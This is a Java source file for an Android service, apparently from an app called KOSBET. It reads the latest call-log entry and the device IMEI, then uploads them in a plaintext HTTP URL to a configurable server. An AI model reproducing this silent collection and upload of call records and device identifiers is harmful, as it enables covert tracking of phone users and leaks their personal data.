package com.kosbet;

import java.io.OutputStream;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import android.annotation.SuppressLint;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.os.IBinder;
import android.provider.CallLog;
import android.telephony.TelephonyManager;
import android.util.Log;

@SuppressLint("SimpleDateFormat")
public class Callservice extends Service {

	boolean isServiceCall = false;
	static String jsn;
	private String time1, hour, min, sec, time, dir, callDuration, callDate,
			callType, phNumber, value, path;
	private int timeInSeconds, dircode, number,name, type, date, duration, i;
	OutputStream output;
	String imei;
	Cursor managedCursor;
	Context con = this;
	StringBuffer sb = new StringBuffer();
	GetJson jsonOperations;
	TelephonyManager telephony;
	Calendar cal;
	Date callDayTime;

	public static String PREFS_IP = "IPADDRESS";
	public static String PREFS_PORT = "PORT";
	String new_ip, new_port;
	private static String IP_DATA = "ip";
	private static String PORT_DATA = "port";

	SimpleDateFormat sdf = new SimpleDateFormat("HH:mm:ss");
	java.text.DateFormat df = new java.text.SimpleDateFormat("yyyy-MM-dd");

	final String todaysdate = df.format(new java.util.Date());

	int hours, minutes, seconds;

	@Override
	public IBinder onBind(Intent arg0) {

		throw new UnsupportedOperationException("Not at implement");
	}

	public void onCreate() {

		isServiceCall = true;
		getIP();
	}

	private void getIP() {
		String ip = "";
		String port = "";
		SharedPreferences settings = getSharedPreferences(PREFS_IP, 0);
		SharedPreferences settings1 = getSharedPreferences(PREFS_PORT, 0);
		ip = settings.getString(IP_DATA, null);
		port = settings1.getString(PORT_DATA, null);
		if (ip == null) {
			if (port == null) {

			}

		} else {
			new_ip = ip;
			new_port = port;
		}

	}

	public void onStart(Intent intent, int startID) {
		if (isServiceCall) {
			Log.i("Call:", "onStart");
			managedCursor = con.getContentResolver().query(
					CallLog.Calls.CONTENT_URI, null, null, null, null);
			i = managedCursor.getCount();
			managedCursor.moveToLast();
			System.out.println("Curser length" + i);
			int x = managedCursor.getPosition();
			System.out.println("Curser position" + x);
			if (i != 0) {
				number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
				name = managedCursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
				type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
				date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
				duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
				sb.append("Call Details :");

				phNumber = managedCursor.getString(number);
				callType = managedCursor.getString(type);
				callDate = managedCursor.getString(date);
				callDayTime = new Date(Long.valueOf(callDate));
				callDuration = managedCursor.getString(duration);
				dir = null;
				dircode = Integer.parseInt(callType);
				switch (dircode) {
				case CallLog.Calls.OUTGOING_TYPE:
					dir = "OUTGOING";
					break;

				case CallLog.Calls.INCOMING_TYPE:
					dir = "RECEIVED";
					break;

				case CallLog.Calls.MISSED_TYPE:
					dir = "MISSED";
					break;
				}
				System.out.println("name"+name);
				managedCursor.close();
				isServiceCall = false;
				timeInSeconds = Integer.parseInt(callDuration);
				hours = timeInSeconds / 3600;

				if (hours < 10) {
					hour = "0" + hours;
				} else {
					hour = "" + hours;
				}
				timeInSeconds = timeInSeconds - (hours * 3600);
				minutes = timeInSeconds / 60;
				if (minutes < 10) {
					min = "0" + minutes;
				} else {
					min = "" + minutes;
				}
				timeInSeconds = timeInSeconds - (minutes * 60);
				seconds = timeInSeconds;
				if (seconds < 10) {
					sec = "0" + seconds;
					System.out.println(sec);
				} else {
					sec = "" + seconds;
				}

				time = hour + ":" + min + ":" + sec;

				cal = Calendar.getInstance();
				cal.getTime();

				time1 = sdf.format(cal.getTime());

				telephony = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
				imei = telephony.getDeviceId();
				value = "ANN" + "&" + phNumber + "("+name+")"+"&" + dir + "&" + todaysdate
						+ "&" + time1 + "&" + time + "&" + imei;
				if (dir.contains("MISSED")) {

					try {
						jsonOperations = new GetJson(con);
						getIP();
						if (new_ip != null) {
							path = "http://" + new_ip + ":" + new_port
									+ "/KOSBET/resources/calllog/" + value;
							System.out.println("path" + path);
							path = path.replaceAll(" ", "%20");
							jsonOperations.execute(new String[] { path });
							// Thread.sleep(3000);
						}
					} catch (Exception e) {

					}

				} else {
					try {
						jsonOperations = new GetJson(con);
						// 182.74.73.29:80
						getIP();
						String path = "http://" + new_ip + ":" + new_port
								+ "/KOSBET/resources/calllog/" + value;
						System.out.println("path" + path);
						path = path.replaceAll(" ", "%20");

						jsonOperations.execute(new String[] { path });
						Thread.sleep(3000);

					} catch (Exception e) {

					}
					sb.append("\nPhone Number:--- " + phNumber
							+ " \nCall Type:--- " + dir + " \nCall Date:--- "
							+ callDayTime + " \nCall duration in sec :--- "
							+ callDuration);
					sb.append("\n----------------------------------");

					Log.i("Result", sb.toString());
					managedCursor.close();
					isServiceCall = false;

				}
			}
		}
	}

}
